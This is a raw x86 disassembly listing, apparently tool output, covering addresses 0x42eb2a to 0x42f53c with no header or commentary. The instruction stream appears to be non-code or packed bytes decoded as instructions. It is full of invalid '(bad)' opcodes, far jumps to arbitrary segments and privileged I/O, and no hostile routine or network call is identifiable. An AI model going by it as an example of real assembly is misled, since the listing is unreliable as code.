  42eb2a:	fistp  WORD PTR [ebx+0x2f]
  42eb2d:	sub    DWORD PTR [ecx-0x6b],ebp
  42eb30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb31:	ret    0xbb13
  42eb34:	test   al,0x0
	...
  42eb96:	jle    0x42ebd9
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi-0x26ea526],ebp
  42eba4:	sub    al,0x58
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ebp+edi*8-0x4d9d06ca],dh
  42ebb4:	cmc    
  42ebb5:	cli    
  42ebb6:	cmc    
  42ebb7:	(bad)  
  42ebb8:	retf   
  42ebb9:	sbb    ch,BYTE PTR [eax+0xc9eeb09]
  42ebbf:	addr16 fwait
  42ebc1:	mov    edx,0xc6bed486
  42ebc6:	mov    ds:0xaab0a755,al
  42ebcb:	sub    eax,0xa1ccf70d
  42ebd0:	stos   DWORD PTR es:[edi],eax
  42ebd1:	popf   
  42ebd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebd3:	out    dx,eax
  42ebd4:	xor    eax,0x7a114f6c
  42ebd9:	(bad)  
  42ebdb:	stos   DWORD PTR es:[edi],eax
  42ebdc:	lods   al,BYTE PTR ds:[esi]
  42ebdd:	repnz sahf 
  42ebdf:	ror    DWORD PTR [ecx+0x3afc794b],cl
  42ebe5:	sub    dl,BYTE PTR [edi-0x52a23168]
  42ebeb:	outs   dx,DWORD PTR ds:[esi]
  42ebec:	push   ecx
  42ebed:	or     ch,BYTE PTR [esi+0x2]
  42ebf0:	sub    DWORD PTR [ecx+0x154c2c60],0xfffffffb
  42ebf7:	ins    DWORD PTR es:[edi],dx
  42ebf8:	mov    edi,0x801fd32d
  42ebfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebfe:	stc    
  42ebff:	repz cmc 
  42ec01:	jmp    0x42ebf5
  42ec03:	or     ah,0x57
  42ec06:	shr    DWORD PTR [ebp+0x3ddf9185],1
  42ec0c:	inc    ebp
  42ec0d:	cmp    edx,DWORD PTR [ecx-0x72]
  42ec10:	rcl    DWORD PTR [esi],cl
  42ec12:	dec    ecx
  42ec13:	aas    
  42ec14:	ret    0x7359
  42ec17:	rol    BYTE PTR [edx+0x50],1
  42ec1a:	adc    DWORD PTR [edx],ecx
  42ec1c:	dec    esi
  42ec1d:	adc    BYTE PTR [edx-0x1b],0x24
  42ec21:	xchg   BYTE PTR [esi-0x235c7c83],cl
  42ec27:	jg     0x42ebe4
  42ec29:	jbe    0x42ec67
  42ec2b:	leave  
  42ec2c:	cmp    eax,0x16bf90e3
  42ec31:	or     eax,0x64976126
  42ec36:	xchg   edi,edx
  42ec38:	lahf   
  42ec39:	les    ebx,FWORD PTR [ecx+ebp*2]
  42ec3c:	add    BYTE PTR [esi+0x5c],bl
  42ec3f:	arpl   WORD PTR [ebx+0x4c532395],bx
  42ec45:	xchg   DWORD PTR [ebp+0x7cbe4e38],ecx
  42ec4b:	int    0xe8
  42ec4d:	dec    ebp
  42ec4e:	sbb    bl,cl
  42ec50:	sbb    DWORD PTR fs:[edx+0x66254349],edx
  42ec57:	and    dl,dl
  42ec59:	call   FWORD PTR [esi-0x1d24767]
  42ec5f:	sub    eax,0x3b89880c
  42ec64:	clc    
  42ec65:	push   edi
  42ec66:	xchg   ebp,eax
  42ec67:	in     eax,dx
  42ec68:	xlat   BYTE PTR ds:[ebx]
  42ec69:	inc    esi
  42ec6a:	out    dx,al
  42ec6b:	ficomp WORD PTR [edx]
  42ec6d:	adc    esi,DWORD PTR [esi]
  42ec6f:	sbb    esp,DWORD PTR [eax*4+0x70f9435]
  42ec76:	or     eax,0x27ae0d9a
  42ec7b:	(bad)  
  42ec7d:	pusha  
  42ec7e:	sbb    al,bh
  42ec80:	bt     DWORD PTR [ebp-0x4470ac95],ebx
  42ec87:	mov    edi,0x11482fa
  42ec8c:	rcr    BYTE PTR [esp+esi*4],cl
  42ec8f:	and    eax,0x34993917
  42ec94:	pop    ebp
  42ec95:	add    DWORD PTR [esi],ecx
  42ec97:	popf   
  42ec98:	shl    DWORD PTR [esi-0x42],1
  42ec9b:	dec    ecx
  42ec9c:	sti    
  42ec9d:	cmp    BYTE PTR [edx+ebp*2+0x744f2d81],ah
  42eca4:	and    al,0x45
  42eca6:	faddp  st(5),st
  42eca8:	loopne 0x42eccc
  42ecaa:	add    ch,BYTE PTR ds:0x8f690a8d
  42ecb0:	out    0xde,eax
  42ecb2:	xor    DWORD PTR [ebx-0x2a],edx
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi-0x6e0f5e81]
  42ed23:	sub    BYTE PTR ds:0x1f5c647,0x0
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [edi],al
  42ed2f:	sub    edi,edi
  42ed31:	xchg   ecx,eax
  42ed32:	sbb    ecx,DWORD PTR [ecx]
  42ed34:	push   cs
  42ed35:	and    eax,DWORD PTR [ebx+0x43]
  42ed38:	popa   
  42ed39:	iret   
  42ed3a:	mov    bh,0x5b
  42ed3c:	aad    0x63
  42ed3e:	scas   al,BYTE PTR es:[edi]
  42ed3f:	stc    
  42ed40:	mov    eax,ds:0xefb27076
  42ed45:	mov    ?,WORD PTR [edi+0x5]
  42ed48:	adc    BYTE PTR [ebx+ecx*8+0x5e],dl
  42ed4c:	in     al,dx
  42ed4d:	(bad)  
  42ed4e:	sti    
  42ed4f:	xchg   ecx,eax
  42ed50:	mov    WORD PTR ds:0xa2947c1,cs
  42ed56:	sti    
  42ed57:	cmc    
  42ed58:	sbb    esp,ecx
  42ed5a:	rcl    DWORD PTR [eax-0x21],1
  42ed5d:	sar    bh,0xa8
  42ed60:	add    BYTE PTR [esi-0x7d7c39c7],dh
  42ed66:	sbb    BYTE PTR [ebp+0x50896a24],ah
  42ed6c:	jp     0x42ed8b
  42ed6e:	ss mov edi,0x11711dd
  42ed74:	cld    
  42ed75:	push   edi
  42ed76:	lods   al,BYTE PTR ds:[esi]
  42ed77:	add    al,0x26
  42ed79:	push   0x27ab2013
  42ed7e:	pop    ebp
  42ed7f:	std    
  42ed80:	scas   eax,DWORD PTR es:[edi]
  42ed81:	call   0x3bc9979b
  42ed86:	inc    edi
  42ed87:	dec    ebp
  42ed88:	push   cs
  42ed89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed8a:	data16 icebp 
  42ed8c:	push   ds
  42ed8d:	cmp    edi,DWORD PTR [ebx-0x4e]
  42ed90:	ret    
  42ed91:	call   0xe2a6:0x2b26eb1d
  42ed98:	adc    eax,DWORD PTR ds:0x83e25e9f
  42ed9e:	bound  eax,QWORD PTR ds:0xe726e672
  42eda4:	adc    edi,DWORD PTR [edi]
  42eda6:	gs aaa 
  42eda8:	and    eax,0xb106f966
  42edad:	test   BYTE PTR [ebx],ch
  42edaf:	pop    edx
  42edb0:	dec    esi
  42edb1:	ss jle 0x42edff
  42edb4:	outs   dx,DWORD PTR ds:[esi]
  42edb5:	mov    ch,0x33
  42edb7:	or     ebp,ecx
  42edb9:	xchg   edi,eax
  42edba:	mov    ch,0x2f
  42edbc:	ss mov ecx,0xe6ba06af
  42edc2:	xchg   ecx,eax
  42edc3:	pop    ds
  42edc4:	in     al,dx
  42edc5:	add    DWORD PTR [edi+0x74],edi
  42edc8:	cs mov esp,0x36451159
  42edce:	add    ah,dl
  42edd0:	daa    
  42edd1:	and    dl,BYTE PTR [ecx-0x423635b7]
  42edd7:	adc    edi,edi
  42edd9:	mov    DWORD PTR [eax],esp
  42eddb:	mov    esi,0x840344c2
  42ede0:	xchg   ebx,eax
  42ede1:	bound  ecx,QWORD PTR [esp+eax*8]
  42ede4:	out    dx,eax
  42ede5:	and    DWORD PTR [eax+edx*4+0x73],ebp
  42ede9:	repnz push 0xffffff97
  42edec:	xchg   edi,eax
  42eded:	xchg   edx,eax
  42edee:	jo     0x42ee0f
  42edf0:	pop    es
  42edf1:	or     al,0xcc
  42edf3:	ret    0x48c1
  42edf6:	push   ss
  42edf7:	(bad)  
  42edf8:	and    ebx,edi
  42edfa:	ret    
  42edfb:	mov    dh,0xa0
  42edfd:	pop    edx
  42edfe:	je     0x42ed8f
  42ee00:	mov    DWORD PTR [edi+0x4412109a],ebx
  42ee06:	inc    edi
  42ee07:	mov    esp,0x879db20b
  42ee0c:	dec    edi
  42ee0d:	repz mov al,ds:0x3438ffc5
  42ee13:	mov    esp,0xd7703e7
  42ee18:	xor    al,0x9
  42ee1a:	and    al,0x24
  42ee1c:	push   0x951143c
  42ee21:	dec    ecx
  42ee22:	push   0x8b671b11
  42ee27:	add    eax,DWORD PTR [ecx-0x6a]
  42ee2a:	repnz pusha 
  42ee2c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee2e:	pop    ss
  42ee2f:	lahf   
  42ee30:	adc    DWORD PTR [edx+0x79],esp
  42ee33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee34:	cmp    BYTE PTR [eax],al
	...
  42ee96:	ret    
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0x513af479,edi
  42eea4:	scas   al,BYTE PTR es:[edi]
  42eea5:	test   eax,0x1f6cd
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    BYTE PTR ds:0xcb83ed60,cl
  42eeb3:	dec    ebp
  42eeb4:	scas   eax,DWORD PTR es:[edi]
  42eeb5:	out    0xbd,eax
  42eeb7:	sbb    esi,DWORD PTR [edx-0x4b362851]
  42eebd:	(bad)  
  42eebf:	inc    ebp
  42eec0:	push   cs
  42eec1:	inc    ebx
  42eec2:	data16 clc 
  42eec4:	push   cs
  42eec5:	mov    esp,DWORD PTR [ebp-0x559f88af]
  42eecb:	and    eax,0xa92f8d2b
  42eed0:	adc    esi,esp
  42eed2:	(bad)  
  42eed3:	fnstsw WORD PTR [edi-0x69]
  42eed6:	pusha  
  42eed7:	test   DWORD PTR [ecx+0x48],edx
  42eeda:	ficom  WORD PTR [ebx+0x9]
  42eedd:	jmp    0xa3cb87e2
  42eee2:	xchg   esi,eax
  42eee3:	xor    al,0x95
  42eee5:	fld    QWORD PTR [ebx+0x68]
  42eee8:	mov    WORD PTR [esi-0xc],fs
  42eeeb:	std    
  42eeec:	cmp    DWORD PTR [edi+0x6fef4ad6],edi
  42eef2:	(bad)  
  42eef4:	test   BYTE PTR [ecx-0x34],ch
  42eef7:	(bad)  
  42eef8:	(bad)  
  42eef9:	data16 cmp bl,BYTE PTR [ecx]
  42eefc:	les    esp,FWORD PTR [eax]
  42eefe:	ins    DWORD PTR es:[edi],dx
  42eeff:	cli    
  42ef00:	lds    edx,FWORD PTR [edx+0x24]
  42ef03:	fisubr DWORD PTR [eax-0xd]
  42ef06:	out    0x0,eax
  42ef08:	pop    eax
  42ef09:	push   ss
  42ef0a:	outs   dx,DWORD PTR ds:[esi]
  42ef0b:	and    al,0x63
  42ef0d:	xor    ah,BYTE PTR [ebp+0x73]
  42ef10:	fs dec ebx
  42ef12:	push   ecx
  42ef13:	int3   
  42ef14:	int    0xc3
  42ef16:	ret    0xae4f
  42ef19:	jg     0x42eeb3
  42ef1b:	sub    ah,dh
  42ef1d:	lock add ebx,DWORD PTR ds:0x9faecf90
  42ef24:	imul   esi,DWORD PTR [edi],0x54
  42ef27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef28:	imul   esi,DWORD PTR [ebx-0x34],0x43
  42ef2c:	add    eax,DWORD PTR [ecx+ebp*1+0x6f869275]
  42ef33:	inc    esp
  42ef34:	and    bh,BYTE PTR ds:0x9de5c8e5
  42ef3a:	mov    ah,0x2f
  42ef3c:	das    
  42ef3d:	push   0xffffffe4
  42ef3f:	adc    BYTE PTR [eax+edx*4-0x64],al
  42ef43:	(bad)
  42ef46:	push   edx
  42ef47:	mov    eax,es:0x34fe4c03
  42ef4d:	sahf   
  42ef4e:	fiadd  DWORD PTR [eax+esi*8]
  42ef51:	dec    ebx
  42ef52:	inc    ebp
  42ef53:	push   ecx
  42ef54:	sbb    al,BYTE PTR [eax+0x73]
  42ef57:	and    DWORD PTR [edi+0x40f1ffbf],ecx
  42ef5d:	sub    bh,cl
  42ef5f:	fwait
  42ef60:	push   edi
  42ef61:	call   0xc97702d0
  42ef66:	mov    al,gs:0x1bef5991
  42ef6c:	cmp    DWORD PTR [esi+0x76a5c93b],ebp
  42ef72:	sub    BYTE PTR [edi],0x56
  42ef75:	mov    esi,0x1c9425dc
  42ef7a:	push   ebp
  42ef7b:	xchg   ecx,eax
  42ef7c:	push   esi
  42ef7d:	sbb    al,0x7f
  42ef7f:	cli    
  42ef80:	jmp    0x49a906d
  42ef85:	outs   dx,DWORD PTR ds:[esi]
  42ef86:	inc    DWORD PTR ds:[ecx+0x79]
  42ef8a:	ins    BYTE PTR es:[edi],dx
  42ef8b:	jmp    0x6666:0x46652733
  42ef92:	cdq    
  42ef93:	js     0x42efb9
  42ef95:	les    eax,FWORD PTR [edx+0xe]
  42ef98:	dec    esp
  42ef99:	add    edi,eax
  42ef9b:	dec    edx
  42ef9c:	out    dx,eax
  42ef9d:	lahf   
  42ef9e:	mov    ds:0x7f50c501,al
  42efa3:	lods   al,BYTE PTR ds:[esi]
  42efa4:	inc    edx
  42efa5:	sub    BYTE PTR [ebx+0x4cad609d],bl
  42efab:	lods   eax,DWORD PTR ds:[esi]
  42efac:	dec    ebx
  42efad:	sar    BYTE PTR [eax],1
  42efaf:	and    DWORD PTR [edx+ecx*8+0x5d5e1d],esi
	...
  42f016:	adc    bh,BYTE PTR [esi]
  42f018:	int    0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x7533d516
  42f024:	ja     0x42f01c
  42f026:	aam    0xf7
  42f028:	add    DWORD PTR [eax],eax
  42f02a:	pop    es
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR [eax-0x3e5abf86],bl
  42f033:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42f035:	cmp    BYTE PTR [ebx-0xf],ch
  42f038:	pop    esi
  42f039:	mov    BYTE PTR [esi+0x53331392],ah
  42f03f:	and    BYTE PTR [esi+0x7c],bh
  42f042:	sub    DWORD PTR [ecx-0x57],esp
  42f045:	leave  
  42f046:	xor    DWORD PTR [eax+eax*4-0x21],ebp
  42f04a:	xor    DWORD PTR [ebp-0x63],esp
  42f04d:	setae  BYTE PTR [edi]
  42f050:	or     al,0xe
  42f052:	aad    0x43
  42f054:	or     al,0x44
  42f056:	in     al,0x56
  42f058:	mov    ecx,esp
  42f05a:	ins    DWORD PTR es:[edi],dx
  42f05b:	sbb    eax,DWORD PTR [edx-0x3fa0b70d]
  42f061:	mov    bl,0x6f
  42f063:	and    al,0x34
  42f065:	mov    eax,0xa5aef48e
  42f06a:	in     al,0xaf
  42f06c:	test   al,0xad
  42f06e:	pop    esp
  42f06f:	ret    0x498b
  42f072:	test   al,0xde
  42f074:	pop    esp
  42f075:	imul   eax,eax,0xfffffffd
  42f078:	sbb    DWORD PTR [ecx+ebp*4+0x521f5d25],edx
  42f07f:	cwde   
  42f080:	jne    0x42f06d
  42f082:	int    0x3
  42f084:	adc    DWORD PTR [edx+ebx*1],0x24
  42f088:	xchg   esi,eax
  42f089:	inc    eax
  42f08a:	sub    DWORD PTR [ecx+0x6f05e13],0xf7b24477
  42f094:	push   cs
  42f095:	test   DWORD PTR [ebp+0x1ff1fe25],edi
  42f09b:	popa   
  42f09c:	mov    al,BYTE PTR [ebx]
  42f09e:	jnp    0x42f0cb
  42f0a0:	cmp    esi,DWORD PTR [ebp-0x77b0e41c]
  42f0a6:	push   0x79c25f82
  42f0ab:	rcr    al,1
  42f0ad:	mov    dl,0xbb
  42f0af:	sahf   
  42f0b0:	lea    esi,[edi]
  42f0b2:	mov    ds:0xeb723744,al
  42f0b7:	out    dx,al
  42f0b8:	jmp    0x4db2:0x4495bc0f
  42f0bf:	pushf  
  42f0c0:	mov    al,BYTE PTR [edi+edx*1+0x46]
  42f0c4:	cs add al,0x7b
  42f0c7:	retf   
  42f0c8:	aaa    
  42f0c9:	call   0x5522ff8f
  42f0ce:	xchg   DWORD PTR [esi-0x7c],ebx
  42f0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0d2:	xchg   ebx,eax
  42f0d3:	test   al,0xd7
  42f0d5:	pop    ss
  42f0d6:	adc    edi,esi
  42f0d8:	clc    
  42f0d9:	mov    ebx,0x46f892e0
  42f0de:	xchg   ebx,eax
  42f0df:	out    dx,eax
  42f0e0:	sahf   
  42f0e1:	test   eax,0xee910d11
  42f0e6:	cli    
  42f0e7:	fisubr WORD PTR [ebx-0x644c1cbe]
  42f0ed:	dec    esp
  42f0ee:	ror    BYTE PTR [ebp-0x70],0x73
  42f0f2:	cmp    cl,dl
  42f0f4:	jb     0x42f0af
  42f0f6:	std    
  42f0f7:	call   0x8b55:0xc35a6bc0
  42f0fe:	rol    ebx,0x59
  42f101:	jp     0x42f16c
  42f103:	or     BYTE PTR ss:[edx-0x1d],dh
  42f107:	out    dx,eax
  42f108:	enter  0x342a,0x97
  42f10c:	and    eax,0x505e82d3
  42f111:	push   0x55
  42f113:	(bad)  
  42f114:	pop    ds
  42f115:	and    al,0x70
  42f117:	add    al,0x8c
  42f119:	pop    edi
  42f11a:	jmp    0x2784d05
  42f11f:	ins    BYTE PTR es:[edi],dx
  42f120:	fstp   DWORD PTR [edx+0x70]
  42f123:	push   ecx
  42f124:	gs cs (bad) 
  42f127:	jmp    0xf0b9:0x59c89d4a
  42f12e:	push   0xffab4996
  42f133:	aas    
  42f134:	sub    eax,0x0
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f150
  42f1a3:	repz int 0xd4
  42f1a6:	(bad)  
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [ebp+0x51fbe96],dl
  42f1b3:	inc    ecx
  42f1b4:	pop    ecx
  42f1b5:	jmp    0x42f1d6
  42f1b7:	inc    esp
  42f1b8:	sub    DWORD PTR [eax],ebx
  42f1ba:	cdq    
  42f1bb:	push   ebp
  42f1bc:	dec    eax
  42f1bd:	dec    ecx
  42f1be:	mov    ch,0x5d
  42f1c0:	mov    WORD PTR [ebx-0x70],fs
  42f1c3:	or     dh,BYTE PTR [ebp-0x1ab4d33b]
  42f1c9:	xchg   ebp,eax
  42f1ca:	das    
  42f1cb:	int    0x86
  42f1cd:	nop
  42f1ce:	sbb    eax,0x55e8f25e
  42f1d3:	or     dh,BYTE PTR [eax+0x6640f387]
  42f1d9:	or     ecx,edx
  42f1db:	push   cs
  42f1dc:	fild   WORD PTR [ecx+0x55af29e5]
  42f1e3:	xchg   esp,eax
  42f1e4:	lds    esp,FWORD PTR [eax-0x6b9d31ad]
  42f1ea:	popa   
  42f1eb:	(bad)  
  42f1ec:	pop    ebp
  42f1ed:	xchg   ebx,eax
  42f1ee:	pop    ebx
  42f1ef:	mov    eax,0x657d0983
  42f1f4:	call   0x19a1898c
  42f1f9:	jge    0x42f1ca
  42f1fb:	fistp  WORD PTR [eax]
  42f1fd:	in     al,0xd9
  42f1ff:	inc    esi
  42f200:	fdiv   DWORD PTR [ebx-0x61c296b2]
  42f206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f207:	lds    ecx,FWORD PTR [edx]
  42f209:	jb     0x42f1c2
  42f20b:	xor    esp,DWORD PTR [edx+0x656adc65]
  42f211:	nop
  42f212:	ja     0x42f28a
  42f214:	inc    esi
  42f215:	iret   
  42f216:	enter  0x633a,0xd7
  42f21a:	aaa    
  42f21b:	pusha  
  42f21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f21d:	iret   
  42f21e:	push   ss
  42f21f:	jp     0x42f281
  42f221:	push   cx
  42f223:	in     al,0x64
  42f225:	inc    edx
  42f226:	imul   esp,DWORD PTR [edi-0x4df98a9c],0xf4849aaf
  42f230:	(bad)  
  42f231:	xor    BYTE PTR [edx+esi*4],al
  42f234:	ss inc esi
  42f236:	add    BYTE PTR [eax-0x4a4aa2b5],bl
  42f23c:	into   
  42f23d:	les    edx,FWORD PTR [eax+0x214c55]
  42f243:	mov    cl,0x74
  42f245:	cmp    ebp,DWORD PTR [eax]
  42f247:	xchg   edx,eax
  42f248:	or     esp,DWORD PTR [edi-0xc2a3e84]
  42f24e:	add    edx,edi
  42f250:	push   0xffffffa7
  42f252:	loop   0x42f2a2
  42f254:	xchg   edi,eax
  42f255:	cwde   
  42f256:	call   0xdab4:0xfe3849d2
  42f25d:	sub    al,0xe5
  42f25f:	repnz mov cl,0x3f
  42f262:	call   0x7bf24ec0
  42f267:	jl     0x42f23a
  42f269:	mov    bh,0x26
  42f26b:	xchg   ebx,eax
  42f26c:	mov    bh,0xe3
  42f26e:	and    DWORD PTR [esi+0x7a679a94],0x7
  42f275:	outs   dx,DWORD PTR ds:[esi]
  42f276:	pop    ds
  42f277:	(bad)  
  42f278:	cmp    ah,BYTE PTR [edi-0x27b9d78c]
  42f27e:	dec    esp
  42f27f:	mov    WORD PTR [edx-0x15],fs
  42f282:	fnstcw WORD PTR [edi+0x28c2e38e]
  42f288:	lods   eax,DWORD PTR ds:[esi]
  42f289:	cdq    
  42f28a:	shr    BYTE PTR [edx+0x338da92f],0x35
  42f291:	fbld   TBYTE PTR [ecx]
  42f293:	loopne 0x42f2d5
  42f295:	rol    BYTE PTR [esp+eax*1+0x28],1
  42f299:	dec    ebp
  42f29a:	mov    al,ds:0xd6fe7ea1
  42f29f:	ins    BYTE PTR es:[edi],dx
  42f2a0:	into   
  42f2a1:	pop    esi
  42f2a2:	es mov dl,0xc
  42f2a5:	dec    ecx
  42f2a6:	sub    al,0xd7
  42f2a8:	jmp    0x9ce6:0xc03b905a
  42f2af:	push   eax
  42f2b0:	in     eax,0xcc
  42f2b2:	sbb    eax,0xf67d
	...
  42f313:	add    BYTE PTR [eax],al
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	call   0x1f9:0xe2a9caf4
  42f329:	add    BYTE PTR [edi],al
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    al,ah
  42f32f:	adc    eax,edi
  42f331:	cmc    
  42f332:	out    dx,eax
  42f333:	outs   dx,BYTE PTR ds:[esi]
  42f334:	jl     0x42f2ef
  42f336:	stos   BYTE PTR es:[edi],al
  42f337:	out    dx,al
  42f338:	jne    0x42f2e1
  42f33a:	jmp    0x2a86:0xeb9e6770
  42f341:	cli    
  42f342:	(bad)  
  42f343:	mov    edi,0xee0b740
  42f348:	push   ecx
  42f349:	or     ah,BYTE PTR [eax-0x313cc47]
  42f34f:	sahf   
  42f350:	sub    DWORD PTR [edx+0x29],esp
  42f353:	xchg   ecx,eax
  42f354:	add    DWORD PTR [esi-0x17efbd97],ebx
  42f35a:	out    dx,al
  42f35b:	xchg   ebx,eax
  42f35c:	int3   
  42f35d:	add    dh,ah
  42f35f:	scas   eax,DWORD PTR es:[edi]
  42f360:	icebp  
  42f361:	cwde   
  42f362:	dec    edi
  42f363:	inc    ebx
  42f364:	jl     0x42f2e6
  42f366:	sar    DWORD PTR [esi],0xdd
  42f369:	mov    esp,0x57643cb3
  42f36e:	mov    edx,0xbdf5eae1
  42f373:	cmp    DWORD PTR [edi+0x3e],edx
  42f376:	cdq    
  42f377:	and    BYTE PTR [ebp+0x65],dl
  42f37a:	std    
  42f37b:	push   ebp
  42f37c:	pop    esi
  42f37d:	add    al,ch
  42f37f:	mov    ch,0x17
  42f381:	cmp    al,0x94
  42f383:	jmp    0x42f3cc
  42f385:	repnz int 0xab
  42f388:	inc    esp
  42f389:	sbb    BYTE PTR [esi],bl
  42f38b:	mov    dh,0xb2
  42f38d:	cmp    BYTE PTR [edx-0x1d],cl
  42f390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f391:	mov    edx,0x7c0e24ef
  42f396:	data16 ss mov bl,0xc8
  42f39a:	sbb    eax,ebx
  42f39c:	in     eax,0xc0
  42f39e:	pop    ebx
  42f39f:	scas   al,BYTE PTR es:[edi]
  42f3a0:	inc    edi
  42f3a1:	pushf  
  42f3a2:	in     eax,0xb9
  42f3a4:	idiv   DWORD PTR [ebx+0x38]
  42f3a7:	(bad)  
  42f3a8:	push   ss
  42f3a9:	addr16 ds mov cl,0x79
  42f3ad:	mov    esp,0xd1eeb232
  42f3b2:	outs   dx,BYTE PTR ds:[esi]
  42f3b3:	sub    DWORD PTR [ebp+0x32],ebx
  42f3b6:	lahf   
  42f3b7:	shr    DWORD PTR [esi],cl
  42f3b9:	idiv   eax
  42f3bb:	dec    edx
  42f3bc:	or     ebx,DWORD PTR [edi-0x47]
  42f3bf:	(bad)  
  42f3c0:	sub    edi,DWORD PTR [ecx+0x47]
  42f3c3:	pop    ss
  42f3c4:	test   cl,dh
  42f3c6:	neg    esp
  42f3c8:	into   
  42f3c9:	imul   ecx,DWORD PTR [ebx+ecx*8-0x60679482],0x536ae69a
  42f3d4:	outs   dx,BYTE PTR ds:[esi]
  42f3d5:	cmp    DWORD PTR [eax-0x589377f7],esp
  42f3db:	or     eax,DWORD PTR [ebx]
  42f3dd:	sbb    eax,0x3f69881c
  42f3e2:	fdivr  QWORD PTR [ebx]
  42f3e4:	in     al,0x57
  42f3e6:	leave  
  42f3e7:	imul   esi,eax,0x4a135703
  42f3ed:	sbb    BYTE PTR [eax-0x27],cl
  42f3f0:	mov    ds:0x514bb912,eax
  42f3f5:	inc    eax
  42f3f6:	stos   DWORD PTR es:[edi],eax
  42f3f7:	mov    dl,0x75
  42f3f9:	lods   eax,DWORD PTR ds:[esi]
  42f3fa:	mov    edx,0x27e533d2
  42f3ff:	mov    DWORD PTR [esi+0x2c],0xc0374d39
  42f406:	ja     0x42f418
  42f408:	push   edi
  42f409:	lea    eax,[ebp-0x30ed1383]
  42f40f:	lock out dx,al
  42f411:	and    BYTE PTR [eax+0x3fb92cb],al
  42f417:	mov    ds:0x79ed7171,eax
  42f41c:	test   al,0x32
  42f41e:	jb     0x42f454
  42f420:	sub    ebp,esp
  42f422:	ins    DWORD PTR es:[edi],dx
  42f423:	neg    DWORD PTR [edx+0x508c5706]
  42f429:	fbstp  TBYTE PTR [ebx+0x46]
  42f42c:	call   0x7cc543a2
  42f431:	add    eax,0xb96119
	...
  42f496:	aaa    
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	push   edx
  42f4a3:	(bad)  
  42f4a4:	mov    esp,0x1fae9d2
  42f4a9:	add    BYTE PTR [edi],al
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [esi+0x461e4b06],ch
  42f4b3:	push   eax
  42f4b4:	add    al,0x84
  42f4b6:	pop    edi
  42f4b7:	dec    ebp
  42f4b8:	lock icebp 
  42f4ba:	pop    esp
  42f4bb:	or     BYTE PTR [esi+edi*1+0x65],ch
  42f4bf:	in     eax,0xec
  42f4c1:	pop    edi
  42f4c2:	rol    DWORD PTR [ebx+0x30],cl
  42f4c5:	out    0x6,al
  42f4c7:	stos   BYTE PTR es:[edi],al
  42f4c8:	loopne 0x42f4e5
  42f4ca:	fldenv [edi]
  42f4cc:	xor    eax,0x46318131
  42f4d1:	(bad)  
  42f4d2:	imul   DWORD PTR [edi-0x76d7eada]
  42f4d8:	loop   0x42f4dd
  42f4da:	pop    ds
  42f4db:	nop
  42f4dc:	and    al,dl
  42f4de:	dec    ebx
  42f4df:	ins    DWORD PTR es:[edi],dx
  42f4e0:	sub    dh,BYTE PTR [ebx]
  42f4e2:	push   eax
  42f4e3:	mov    ebx,0xeff9df76
  42f4e8:	mov    ebp,0x89dce4b9
  42f4ed:	ins    DWORD PTR es:[edi],dx
  42f4ee:	cdq    
  42f4ef:	hlt    
  42f4f0:	sbb    DWORD PTR [edx+0x23d5424a],edi
  42f4f6:	clc    
  42f4f7:	stc    
  42f4f8:	add    edi,esp
  42f4fa:	sahf   
  42f4fb:	test   al,0xab
  42f4fd:	mov    ebx,ds
  42f4ff:	jg     0x42f54d
  42f501:	mov    edx,0xa00b26d2
  42f506:	mov    WORD PTR [ecx+esi*4-0x67cb4d13],ds
  42f50d:	and    BYTE PTR [ecx+0x49b64c16],0x3c
  42f514:	cmp    dl,BYTE PTR [edi]
  42f516:	sar    BYTE PTR [edx],0x6c
  42f519:	adc    cl,BYTE PTR [ecx+ebp*4]
  42f51c:	ret    0xb246
  42f51f:	test   DWORD PTR [edx-0x64f59b06],0x32f1119
  42f529:	xchg   ebp,eax
  42f52a:	cmp    al,0x55
  42f52c:	shl    BYTE PTR [ecx+0x1f],1
  42f52f:	fisub  WORD PTR [ebp+0x5c]
  42f532:	push   ebx
  42f533:	icebp  
  42f534:	xchg   ecx,eax
  42f535:	lea    ebx,[ebx]
  42f537:	xchg   ebx,eax
  42f538:	retf   0x468f
  42f53b:	pop    es
  42f53c:	add    BYTE PTR [ecx],0x61
